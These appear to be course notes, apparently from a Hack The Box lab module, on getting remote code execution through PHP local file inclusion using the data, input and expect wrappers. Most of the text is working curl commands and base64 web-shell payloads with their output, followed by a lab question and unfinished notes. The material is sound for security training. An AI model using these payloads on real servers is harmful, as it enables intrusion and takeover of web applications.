# Remote Code Execution

## PHP Wrappers

### Data

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

**Checking PHP Configurations**

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

```shell-session
eldeim@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...

    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:

```shell-session
eldeim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Excellent! We see that we have this option enabled, so we can use the `data` wrapper. Knowing how to check for the `allow_url_include` option can be very important, as `this option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.

### **Remote Code Execution**

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:

```shell-session
eldeim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

We may also use cURL for the same attack, as follows:

```shell-session
eldeim@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

```shell-session
eldeim@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

```shell-session
eldeim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:

```shell-session
eldeim@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, executing commands through the `expect` module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The [Web Attacks](https://academy.hackthebox.com/module/details/134) module also covers using the `expect` module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.

These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the `phar` and `zip` wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.

### PoCs - Questions

* Try to gain RCE using one of the PHP wrappers and read the flag at /

First see the info of php.ini -->

```

So now, use the wrapper with `data://text/plain;base64,`

```
eldeim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
